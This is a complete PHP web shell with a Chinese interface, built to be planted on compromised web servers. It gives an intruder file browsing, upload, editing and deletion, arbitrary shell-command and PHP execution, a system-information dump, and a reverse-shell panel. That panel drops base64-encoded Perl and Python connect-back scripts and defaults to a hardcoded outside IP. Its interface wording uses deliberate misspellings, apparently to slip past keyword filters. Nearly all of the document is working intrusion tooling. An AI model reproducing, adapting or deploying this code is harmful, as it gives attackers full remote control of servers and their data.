<?php
error_reporting(E_ERROR);
@ini_set('display_errors','Off');
@ini_set('max_execution_time',20000);
@ini_set('memory_limit','256M');
// if(md5($_SERVER['HTTP_USER_AGENT']."4yYczIKA1HPp") !== '1660a8d1d12c008a42e2fe2f459bee92' || md5($_SERVER['HTTP_6VJRBLS7A2']."4yYczIKA1HPp") !=='584e862d903ae0f413125c6e9d47b233'){
// 	header("HTTP/1.1 404 Not Found");
// 	echo 'No input file specified.';exit();
// }
header("content-Type: text/html; charset=utf-8");
function strdir($str) { return str_replace(array('\\','//','%27','%22'),array('/','/','\'','"'),chop($str)); }
function chkgpc($array) { foreach($array as $key => $var) { $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var); } return $array; }
$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
$myfile = strpos($myfile,'eval()') ? array_shift(explode('(',$myfile)) : $myfile;
define('THISDIR',strdir(dirname($myfile).'/'));
define('ROOTDIR',strdir(strtr($myfile,array(strdir($_SERVER['PHP_SELF']) => '')).'/'));
define('EXISTS_PHPINFO',getinfo() ? true : false);
if(get_magic_quotes_gpc()) { $_POST = chkgpc($_POST); }
$win = substr(PHP_OS,0,3) == 'WIN' ? true : false;
$msg = "信息回显";
function filew($filename,$filedata,$filemode) {
	if((!is_writable($filename)) && file_exists($filename)) { chmod($filename,0666); }
	$handle = fopen($filename,$filemode);
	$key = fputs($handle,$filedata);
	fclose($handle);
	return $key;
}
function filer($filename) {
	$handle = fopen($filename,'r');
	$filedata = fread($handle,filesize($filename));
	fclose($handle);
	return $filedata;
}
function fileu($filenamea,$filenameb) {
	$key = move_uploaded_file($filenamea,$filenameb) ? true : false;
	if(!$key) { $key = copy($filenamea,$filenameb) ? true : false; }
	return $key;
}
function filed($filename) {
	if(!file_exists($filename)) return false;
	ob_end_clean();
	$name = basename($filename);
	$array = explode('.',$name);
	header('Content-type: application/x-'.array_pop($array));
	header('Content-Disposition: attachment; filename='.$name);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}
function showdir($dir) {
	$dir = strdir($dir.'/');
	if(($handle = @opendir($dir)) == NULL) return false;
	$array = array();
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		$name = strtr($name,array('\'' => '%27','"' => '%22'));
		if(is_dir($path)) { $array['dir'][$path] = $name; }
		else { $array['file'][$path] = $name; }
	}
	closedir($handle);
	return $array;
}
function deltree($dir) {
	$handle = @opendir($dir);
	while(false !== ($name = @readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		@chmod($path,0777);
		if(is_dir($path)) { deltree($path.'/'); }
		else { @unlink($path); }
	}
	@closedir($handle);
	return @rmdir($dir);
}
function size($bytes) {
	if($bytes < 1024) return $bytes.' B';
	$array = array('B','K','M','G','T');
	$floor = floor(log($bytes) / log(1024));
	return sprintf('%.2f '.$array[$floor],($bytes/pow(1024,floor($floor))));
}
function find($array,$string) {
	foreach($array as $key) { if(stristr($string,$key)) return true; }
	return false;
}
function scanfile($dir,$key,$inc,$fit,$tye,$chr,$ran,$now) {
	if(($handle = @opendir($dir)) == NULL) return false;
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		if(is_dir($path)) { if($fit && in_array($name,$fit)) continue; if($ran == 0 && is_readable($path)) scanfile($path.'/',$key,$inc,$fit,$tye,$chr,$ran,$now); }
		else {
			if($inc && (!find($inc,$name))) continue;
			$code = $tye ? filer($path) : $name;
			$find = $chr ? stristr($code,$key) : (strpos(size(filesize($path)),'M') ? false : (strpos($code,$key) > -1));
			if($find) {
				$file = strtr($path,array($now => '','\'' => '%27','"' => '%22'));
				echo '<a href="javascript:go(\'editor\',\''.$file.'\');">编辑</a> '.$path.'<br>';
				flush(); ob_flush();
			}
			unset($code);
		}
	}
	closedir($handle);
	return true;
}
function antivirus($dir,$exs,$matches,$now) {
	if(($handle = @opendir($dir)) == NULL) return false;
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		if(is_dir($path)) { if(is_readable($path)) antivirus($path.'/',$exs,$matches,$now); }
		else {
			$iskill = NULL;
			foreach($exs as $key => $ex) { if(find(explode('|',$ex),$name)) { $iskill = $key; break; } }
			if(strpos(size(filesize($path)),'M')) continue;
			if($iskill) {
				$code = filer($path);
				foreach($matches[$iskill] as $matche) {
					$array = array();
					preg_match($matche,$code,$array);
					if(strpos($array[0],'$this->') || strpos($array[0],'[$vars[')) continue;
					$len = strlen($array[0]);
					if($len > 6 && $len < 200) {
						$file = strtr($path,array($now => '','\'' => '%27','"' => '%22'));
						echo '特征 <input type="text" value="'.htmlspecialchars($array[0]).'"> <a href="javascript:go(\'editor\',\''.$file.'\');">编辑</a> '.$path.'<br>';
						flush(); ob_flush(); break;
					}
				}
				unset($code,$array);
			}
		}
	}
	closedir($handle);
	return true;
}
function command($cmd,$cwd,$com = false) {
	$iswin = substr(PHP_OS,0,3) == 'WIN' ? true : false; $res = $msg = '';
	if($cwd == 'com' || $com) {
		if($iswin && class_exists('COM')) {
			$wscript = new COM('Wscript.Shell');
			$exec = $wscript->exec('c:\\windows\\system32\\cmd.exe /c '.$cmd);
			$stdout = $exec->StdOut();
			$res = $stdout->ReadAll();
			$msg = 'Wscript.Shell';
		}
	} else {
		chdir($cwd); $cwd = getcwd();
		if(function_exists('exec')) { @exec ($cmd,$res); $res = join("\n",$res); $msg = 'exec'; }
		elseif(function_exists('shell_exec')) { $res = @shell_exec ($cmd); $msg = 'shell_exec'; }
		elseif(function_exists('system')) { ob_start(); @system ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'system'; }
		elseif(function_exists('passthru')) { ob_start(); @passthru ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'passthru'; }
		elseif(function_exists('popen')) { $fp = @popen ($cmd,'r'); if($fp) { while(!feof($fp)) { $res .= fread($fp,1024); } } @pclose($fp); $msg = 'popen'; }
		elseif(function_exists('proc_open')) {
			$env = $iswin ? array('path' => 'c:\\windows\\system32') : array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
			$des = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
			$process = @proc_open ($cmd,$des,$pipes,$cwd,$env);
			if(is_resource($process)) { fwrite($pipes[0],$cmd); fclose($pipes[0]); $res .= stream_get_contents($pipes[1]); fclose($pipes[1]); $res .= stream_get_contents($pipes[2]); fclose($pipes[2]); }
			@proc_close($process);
			$msg = 'proc_open';
		}
	}
	$msg = $res == '' ? '<h1>NULL</h1>' : '<h2>利用'.$msg.'执行成功</h2>';
	return array('res' => $res,'msg' => $msg);
}
function backshell($ip,$port,$dir,$type) {
	$key = false;
	$c_bin = '';
	switch($type) {
		case "pl" : 
		$shell = 'IyEvdXNyL2Jpbi9wZXJsIC13DQojIA0KdXNlIHN0cmljdDsNCnVzZSBTb2NrZXQ7DQp1c2UgSU86OkhhbmRsZTsNCm15ICRzcGlkZXJfaXAgPSAkQVJHVlswXTsNCm15ICRzcGlkZXJfcG9ydCA9ICRBUkdWWzFdOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0KbXkgJHBhY2tfYWRkciA9IHNvY2thZGRyX2luKCRzcGlkZXJfcG9ydCwgaW5ldF9hdG9uKCRzcGlkZXJfaXApKTsNCm15ICRzaGVsbCA9ICcvYmluL3NoIC1pJzsNCnNvY2tldChTT0NLLCBBRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsNClNURE9VVC0+YXV0b2ZsdXNoKDEpOw0KU09DSy0+YXV0b2ZsdXNoKDEpOw0KY29ubmVjdChTT0NLLCRwYWNrX2FkZHIpIG9yIGRpZSAiY2FuIG5vdCBjb25uZWN0OiQhIjsNCm9wZW4gU1RESU4sICI8JlNPQ0siOw0Kb3BlbiBTVERPVVQsICI+JlNPQ0siOw0Kb3BlbiBTVERFUlIsICI+JlNPQ0siOw0Kc3lzdGVtKCRzaGVsbCk7DQpjbG9zZSBTT0NLOw0KZXhpdCAwOw0K';
		$file = strdir($dir.'/t00ls.pl');
		$key = filew($file,base64_decode($shell),'w');
		if($key) { @chmod($file,0777); command('/usr/bin/perl '.$file.' '.$ip.' '.$port,$dir); }
		break;
		case "py" : 
		$shell = 'IyEvdXNyL2Jpbi9weXRob24NCiMgDQppbXBvcnQgc3lzLG9zLHNvY2tldCxwdHkNCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQpzLmNvbm5lY3QoKHN5cy5hcmd2WzFdLCBpbnQoc3lzLmFyZ3ZbMl0pKSkNCm9zLmR1cDIocy5maWxlbm8oKSwgc3lzLnN0ZGluLmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3Rkb3V0LmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3RkZXJyLmZpbGVubygpKQ0KcHR5LnNwYXduKCcvYmluL3NoJykNCg==';
		$file = strdir($dir.'/t00ls.py');
		$key = filew($file,base64_decode($shell),'w');
		if($key) { @chmod($file,0777); command('/usr/bin/python '.$file.' '.$ip.' '.$port,$dir); }
		break;
		case "pcntl" : 
		$file = strdir($dir.'/t00ls');
		$key = filew($file,base64_decode($c_bin),'wb');
		if($key) { @chmod($file,0777); if(function_exists('pcntl_exec')) { @pcntl_exec($file,array($ip,$port)); } }
		break;
	}
	if(!$key) { $msg = '<h1>临时目录不可写</h1>'; } else { @unlink($file); $msg = '<h2>CLOSE</h2>'; }
	return $msg;
}
function getinfo() {
	return function_exists('phpinfo');
}
if(isset($_POST['action'])) {
	if($_POST['action'] == 'down') {
		$downfile = $fileb = strdir($_POST["rsv_bp"].'/'.$_POST["wd"]);
		if(!filed($downfile)) { $msg = '<h1>下载文贱不存在</h1>'; }
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<style type="text/css">
* {margin:0px;padding:0px;}
body {background:#000000;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}
a{color:#000000;text-decoration:none;vertical-align:middle;}
a:hover{color:#FF0000;text-decoration:underline;}
p {padding:1px;line-height:1.6em;}
h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}
h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}
form {display:inline;}
input,select { vertical-align:middle; }
input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}
input[type=submit], input[type=button] {height:21px;}
.tag {text-align:center;background:threedface;height:25px;padding-top:5px;}
.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}
.tag a:hover, .tag a.current {background:#CCC333;color:#000000;text-decoration:none;}
.main {width:963px;margin:0 auto;padding:10px;}
.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}
.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}
.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}
.msgbox {padding:5px;background:#CCC333;text-align:center;vertical-align:middle;}
.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}
.tables {width:100%;}
.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}
.tables td {background:#F9F6F4;height:19px;padding-left:2px;}
</style>
<script type="text/javascript">
function $(ID) { return document.getElementById(ID); }
function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }
function cd(dir) { dir = sd(dir); $('rsv_t').value = dir; $('frm').submit(); }
function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }
function go(a,b) { b = sd(b); $('action').value = a; $("wd").value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } 
function nf(a,b) { re = prompt("新建名",b); if(re) { $('action').value = a; $("wd").value = re; $('gofrm').submit(); } } 
function dels(a) { if(a == 'b') { var msg = "所选文贱"; $('act').value = a; } else { var msg = "目录"; $('act').value = 'deltree'; $('var').value = a; } if(confirm("确定要删"+msg+"吗")) { $('frm1').submit(); } }
function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }
function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }
</script>
<title><?php echo VERSION.' - 【'.date('Y-m-d H:i:s 星期N',time()).'】';?></title>
</head>
<body>
<div class="main">
	<div class="outl">
	<div class="toptag"><?php echo ($_SERVER['SERVER_ADDR'] ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])).' - '.php_uname().'';?></div>
<?php 
$menu = array('file' => '文贱管理','1' => '反谈端口','2' => '执行密令','3' => '执行PHP','4' => '系统信息');
$go = array_key_exists($_POST['action'],$menu) ? $_POST['action'] : 'file';
$nowdir = isset($_POST['rsv_t']) ? strdir(chop($_POST['rsv_t']).'/') : THISDIR;
echo '<div class="tag">';
foreach($menu as $key => $name) { echo '<a'.($go == $key ? ' class="current"' : '').' href="javascript:go(\''.$key.'\',\''.$nowdir.'\');">'.$name.'</a> '; }
echo '</div>';

echo '<form name="gofrm" id="gofrm" method="POST">';;
echo '<input type="hidden" name="action" id="action" value="">';
echo '<input type="hidden" name="rsv_bp" id="rsv_bp" value="'.$nowdir.'">';
echo '<input type="hidden" name="wd" id="wd" value="">';
echo '</form>';
switch($_POST['action']) {
case "4" : 
if(EXISTS_PHPINFO) {
	ob_start();
	phpinfo(INFO_GENERAL);
	$out = ob_get_contents();
	ob_end_clean();
	$tmp = array();
	preg_match_all('/\<td class\=\"e\"\>.*?(Command|Configuration)+.*?\<\/td\>\<td class\=\"v\"\>(.*?)\<\/td\>/i',$out,$tmp);
	$config = $tmp[2][0];
	$phpini = $tmp[2][2] ? $tmp[2][1].' --- '.$tmp[2][2] : $tmp[2][1];
}
$infos = array(
	'限制目录' => ini_get('open_basedir'),
	'系统版本' => php_uname(),
	'系统环境' => $_SERVER['SERVER_SOFTWARE'],
	'被禁用的函数' => get_cfg_var("disable_functions") ? get_cfg_var("disable_functions") : '(无)',
	'被禁用的类' => get_cfg_var("disable_classes") ? get_cfg_var("disable_classes") : '(无)',
	'PHP.ini配置路径' => $phpini ? $phpini : '(无)',
	'PHP运行方式' => php_sapi_name(),
	'PHP版本' => PHP_VERSION,
	'PHP进程PID' => getmypid(),
	'Web服务端口' => $_SERVER['SERVER_PORT'],
	'Web根目录' => $_SERVER['DOCUMENT_ROOT'],
	'Web执行脚本' => $_SERVER['SCRIPT_FILENAME'],
	'Web规范CGI版本' => $_SERVER['GATEWAY_INTERFACE'],
	'Web管理员Email' => $_SERVER['SERVER_ADMIN'] ? $_SERVER['SERVER_ADMIN'] : '(无)',
	'当前磁盘总大小' => size(disk_total_space('.')),
	'当前磁盘可用空间' => size(disk_free_space('.')),
	'是否支持Pcntl' => function_exists('pcntl_exec') ? '是' : '否',
	'是否运行于安全模式' => get_cfg_var("safemode") ? '是' : '否',
	'是否允许动态加载链接库' => get_cfg_var("enable_dl") ? '是' : '否',
	'是否显示错误信息' => get_cfg_var("display_errors") ? '是' : '否',
	'是否自动注册全局变量' => get_cfg_var("register_globals") ? '是' : '否',
	'是否使用反斜线引用字符串' => get_cfg_var("magic_quotes_gpc") ? '是' : '否',
	'PHP编译参数' => $config ? $config : '(无)'
);
echo '<div class="msgbox">'.$msg.'</div>';
echo '<table class="tables"><tr><th style="width:26%;">名称</th><th>参数</th></tr>';
foreach($infos as $name => $var) { echo '<tr><td>'.$name.'</td><td>'.$var.'</td></tr>'; }
echo '</table>';
break;
case "2" : 
$cmd = $win ? 'dir' : 'ls -al';
$res = array('res' => '命令回显','msg' => $msg);
$str = isset($_POST['str']) ? $_POST['str'] : 'fun';
if(isset($_POST['rsv_pq'])) {
	$cmd = $_POST['rsv_pq'];
	$cwd = $str == 'fun' ? THISDIR : 'com';
	$res = command($cmd,$cwd);
}
echo '<div class="msgbox">'.$res['msg'].'</div>';
echo '<form method="POST">';;
echo '<input type="hidden" name="action" id="action" value="2">';
echo '<div class="actall">命令 <input type="text" name="rsv_pq" id="rsv_pq" value="'.htmlspecialchars($cmd).'" style="width:398px;"> ';
echo '<select name="str">';
$selects = array('fun' => 'phpfun','com' => 'wscript');
foreach($selects as $var => $name) { echo '<option value="'.$var.'"'.($var == $str ? ' selected' : '').'>'.$name.'</option>'; }
echo '</select> ';
echo '<input type="submit" style="width:50px;" value="执行">';
echo '</div><div class="actall"><textarea style="width:698px;height:368px;">'.htmlspecialchars($res['res']).'</textarea></div></form>';
break;
case "3" : 
if(isset($_POST['phpcode'])) {
	$phpcode = chop($_POST['phpcode']);
	ob_start();
	if(substr($phpcode,0,2) == '<?' && substr($phpcode,-2) == '?>') { @eval ('?>'.$phpcode.'<?php '); }
	else { @eval ($phpcode); }
	$out = ob_get_contents();
	ob_end_clean();
} else {
	$phpcode = 'phpinfo();';
	$out = '回显窗口';
}
echo base64_decode('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmZ1bmN0aW9uIHJ1bmNvZGUob2JqbmFtZSkge3ZhciB3aW5uYW1lID0gd2luZG93Lm9wZW4oJycsIl9ibGFuayIsJycpO3ZhciBvYmogPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChvYmpuYW1lKTt3aW5uYW1lLmRvY3VtZW50Lm9wZW4oJ3RleHQvaHRtbCcsJ3JlcGxhY2UnKTt3aW5uYW1lLm9wZW5lciA9IG51bGw7d2lubmFtZS5kb2N1bWVudC53cml0ZShvYmoudmFsdWUpO3dpbm5hbWUuZG9jdW1lbnQuY2xvc2UoKTt9PC9zY3JpcHQ+');
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form method="POST">';
echo '<input type="hidden" name="action" id="action" value="3">';
echo '<div class="actall"><p><textarea name="phpcode" id="phpcode" style="width:698px;height:180px;">'.htmlspecialchars($phpcode).'</textarea></p><p>';
echo '<input type="submit" style="width:80px;" value="执行"></p></div>';
echo '</form><div class="actall"><p><textarea id="evalcode" style="width:698px;height:180px;">'.htmlspecialchars($out).'</textarea></p><p><input type="button" value="以HTML运行以上代码" onclick="runcode(\'evalcode\')"></p></div>';
break;
case "1" : 
if((!empty($_POST['backip'])) && (!empty($_POST['backport']))) {
	$backip = $_POST['backip'];
	$backport = $_POST['backport'];
	$temp = $_POST['temp'] ? $_POST['temp'] : '/tmp';
	$type = $_POST['type'];
	$msg = backshell($backip,$backport,$temp,$type);
} else {
	$backip = '222.73.219.91';
	$backport = '443';
	$temp = '/tmp';
	$type = 'pl';
}
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form method="POST">';
echo '<input type="hidden" name="action" id="action" value="1">';
echo '<table class="tables"><tr><th style="width:15%;">名称</th><th>设置</th></tr>';
echo '<tr><td>反谈地址</td><td><input type="text" name="backip" style="width:268px;" value="'.$backip.'"> (Your ip)</td></tr>';
echo '<tr><td>反谈端口</td><td><input type="text" name="backport" style="width:268px;" value="'.$backport.'"> (nc -vvlp '.$backport.')</td></tr>';
echo '<tr><td>临时目录</td><td><input type="text" name="temp" style="width:268px;" value="'.$temp.'"> (Only Linux)</td></tr>';
echo '<tr><td>反谈方法</td><td>';
$types = array('pl' => 'Perl','py' => 'Python','pcntl' => 'Pcntl','php' => 'PHP','phpwin' => 'PHP-WS');
foreach($types as $key => $name) { echo '<label><input type="radio" name="type" value="'.$key.'"'.($key == $type ? ' checked' : '').'>'.$name.'</label> '; }
echo '</td></tr><tr><td>操作</td><td><input type="submit" style="width:80px;" value="反谈"></td></tr>';
echo '</table></form>';
break;
case "edit" : case "editor" : 
$file = strdir($_POST["rsv_bp"].'/'.$_POST["wd"]);
$iconv = function_exists('iconv');
if(!file_exists($file)) {
	$msg = '【新建文贱】';
} else {
	$code = filer($file);
	$chst = '默认';
	$size = size(filesize($file));
	$msg = '【文贱属性 '.substr(decoct(fileperms($file)),-4).'】 【文贱大小 '.$size.'】 【文贱编码 '.$chst.'】';
}
echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"> - '.$msg.'</div>';
echo '<form name="editfrm" id="editfrm" method="POST">';
echo '<input type="hidden" name="action" value=""><input type="hidden" name="act" id="act" value="edit">';
echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.dirname($file).'">';
echo '<div class="actall">文贱 <input type="text" name="filename" value="'.$file.'" style="width:528px;"> ';
echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">'.htmlspecialchars($code).'</textarea></div></form>';
echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="保存" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="action" value=""><input type="hidden" name="rsv_t" id="rsv_t" value="'.dirname($file).'">';
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="返回" style="width:80px;"></form></div>';
break;
case "upfiles" : 
$updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST["rsv_bp"];
$msg = '【最大上船文贱 '.get_cfg_var("upload_max_filesize").'】 【POST最大提交数据 '.get_cfg_var("post_max_size").'】';
$max = 10;
if(isset($_FILES['uploads']) && isset($_POST['renames'])) {
	$uploads = $_FILES['uploads'];
	$msgs = array();
	for($i = 1;$i < $max;$i++) {
		if($uploads['error'][$i] == UPLOAD_ERR_OK) {
			$rename = $_POST['renames'][$i] == '' ? $uploads['name'][$i] : $_POST['renames'][$i];
			$filea = $uploads['tmp_name'][$i];
			$fileb = strdir($updir.'/'.$rename);
			$msgs[$i] = fileu($filea,$fileb) ? '<br><h2>上船成功 '.$rename.'</h2>' : '<br><h1>上船失败 '.$rename.'</h1>';
		}
	}
}
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
echo '<input type="hidden" name="action" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
echo '<div class="actall"><p>上船到目录 <input type="text" name="updir" style="width:398px;" value="'.$updir.'"></p>';
for($i = 1;$i < $max;$i++) { echo '<p>附贱'.$i.' <input type="file" name="uploads['.$i.']" style="width:300px;"> 重命名 <input type="text" name="renames['.$i.']" style="width:128px;"> '.$msgs[$i].'</p>'; }
echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="上船" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="action" value=""><input type="hidden" name="rsv_t" id="rsv_t" value="'.$updir.'">';
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="返回" style="width:80px;"></form></div>';
break;

default : 

if(isset($_FILES['upfile'])) {
	if($_FILES['upfile']['name'] == '') { $msg = '<h1>请选择文贱</h1>'; }
	else { $rename = $_POST['rename'] == '' ? $_FILES['upfile']['name'] : $_POST['rename']; $filea = $_FILES['upfile']['tmp_name']; $fileb = strdir($nowdir.$rename); $msg = fileu($filea,$fileb) ? '<h2>上船文贱'.$rename.'成功</h2>' : '<h1>上船文贱'.$rename.'失败</h1>'; }
}

if(isset($_POST['act'])) {
	switch($_POST['act']) {
		case "a" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文贱 '.$_POST['var'].'</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @copy(strdir($nowdir.$filename),strdir($_POST['var'].'/'.$filename)) ? 1 : 0; } $msg =  $msg = $i ? '<h2>共复制 '.$i.' 个文贱到'.$_POST['var'].'成功</h2>' : '<h1>共复制 '.$i.' 个文贱到'.$_POST['var'].'失败</h1>'; }
		break;
		case "b" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文贱</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @unlink(strdir($nowdir.$filename)) ? 1 : 0; } $msg = $i ? '<h2>共删 '.$i.' 个文贱成功</h2>' : '<h1>共删 '.$i.' 个文贱失败</h1>'; }
		break;
		case "c" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文贱 '.$_POST['var'].'</h1>'; }
			elseif(!ereg("^[0-7]{4}$",$_POST['var'])) { $msg = '<h1>属性值错误</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @chmod(strdir($nowdir.$filename),base_convert($_POST['var'],8,10)) ? 1 : 0; } $msg = $i ? '<h2>共 '.$i.' 个文贱修改属性为'.$_POST['var'].'成功</h2>' : '<h1>共 '.$i.' 个文贱修改属性为'.$_POST['var'].'失败</h1>'; }
		break;
		case "d" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文贱 '.$_POST['var'].'</h1>'; }
			elseif(!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/',$_POST['var'])) { $msg = '<h1>时间格式错误 '.$_POST['var'].'</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @touch(strdir($nowdir.$filename),strtotime($_POST['var'])) ? 1 : 0; } $msg = $i ? '<h2>共 '.$i.' 个文贱修改时间为'.$_POST['var'].'成功</h2>' : '<h1>共 '.$i.' 个文贱修改时间为'.$_POST['var'].'失败</h1>'; }
		break;
		case "e" : 
			$path = strdir($nowdir.$_POST['var'].'/');
			if(file_exists($path)) { $msg = '<h1>目录已存在 '.$_POST['var'].'</h1>'; }
			else { $msg = @mkdir($path,0777) ? '<h2>创建目录 '.$_POST['var'].' 成功</h2>' : '<h1>创建目录 '.$_POST['var'].' 失败</h1>'; }
		break;
		case "f" : 
			$context = array('http' => array('timeout' => 30));
			if(function_exists('stream_context_create')) { $stream = stream_context_create($context); }
			$data = @file_get_contents ($_POST['var'],false,$stream);
			$filename = array_pop(explode('/',$_POST['var']));
			if($data) { $msg = filew(strdir($nowdir.$filename),$data,'wb') ? '<h2>下载 '.$filename.' 成功</h2>' : '<h1>下载 '.$filename.' 失败</h1>'; } else { $msg = '<h1>下载失败或不支持下载</h1>'; }
		break;
		case "rf" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>输入错误</h1>'; }
			else { $msg = @rename(strdir($nowdir.$files[1]),strdir($nowdir.$files[0])) ? '<h2>重命名 '.$files[1].' 为 '.$files[0].' 成功</h2>' : '<h1>重命名 '.$files[1].' 为 '.$files[0].' 失败</h1>'; }
		break;
		case "pd" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>输入错误</h1>'; }
			else { $path = strdir($nowdir.$files[1]); $msg = @chmod($path,base_convert($files[0],8,10)) ? '<h2>修改'.$files[1].'属性为'.$files[0].'成功</h2>' : '<h1>修改'.$files[1].'属性为'.$files[0].'失败</h1>'; }
		break;
		case "edit" : 
			if(isset($_POST['filename']) && isset($_POST['filecode'])) { if($_POST['tostr'] == 'utf') { $_POST['filecode'] = @iconv('GB2312//IGNORE','UTF-8',$_POST['filecode']); } $msg = filew($_POST['filename'],$_POST['filecode'],'w') ? '<h2>保存成功 '.$_POST['filename'].'</h2>' : '<h1>保存失败 '.$_POST['filename'].'</h1>'; }
		break;
		case "deltree" : 
			$deldir = strdir($nowdir.$_POST['var'].'/');
			if(!file_exists($deldir)) { $msg = '<h1>目录 '.$_POST['var'].' 不存在</h1>'; }
			else { $msg = deltree($deldir) ? '<h2>删目录 '.$_POST['var'].' 成功</h2>' : '<h1>删目录 '.$_POST['var'].' 失败</h1>'; }
		break;
	}
}
$chmod = substr(decoct(fileperms($nowdir)),-4);
if(!$chmod) { $msg .= ' - <h1>无法读取目录</h1>'; }
$array = showdir($nowdir);
$thisurl = strdir('/'.strtr($nowdir,array(ROOTDIR => '')).'/');
$nowdir = strtr($nowdir,array('\'' => '%27','"' => '%22'));
echo '<div class="msgbox">'.$msg.'</div>';
echo '<div class="actall"><form name="frm" id="frm" method="POST">';
echo (is_writable($nowdir) ? '<h2>路径</h2>' : '<h1>路径</h1>').' <input type="text" name="rsv_t" id="rsv_t" style="width:508px;" value="'.strdir($nowdir.'/').'"> ';
echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="转到"> ';
echo '<input type="button" onclick="cd(\''.ROOTDIR.'\');" style="width:68px;" value="根目录"> ';
echo '<input type="button" onclick="cd(\''.THISDIR.'\');" style="width:68px;" value="程序目录"> ';
echo '</form></div><div class="actall">';
echo '<input type="button" value="贱立文贱" onclick="nf(\'edit\',\'newfile.php\');" style="width:68px;"> ';
echo '<input type="button" value="贱立目录" onclick="txts(\'目录名\',\'newdir\',\'e\');" style="width:68px;"> ';
echo '<input type="button" value="下栽文贱" onclick="txts(\'下载文贱到当前目录\',\'http://www.baidu.com/cmd.exe\',\'f\');" style="width:68px;"> ';
echo '<input type="button" value="批量上船" onclick="go(\'upfiles\',\''.$nowdir.'\');" style="width:68px;"> ';
echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.$nowdir.'">';
echo '<input type="file" name="upfile" style="width:286px;height:21px;"> ';
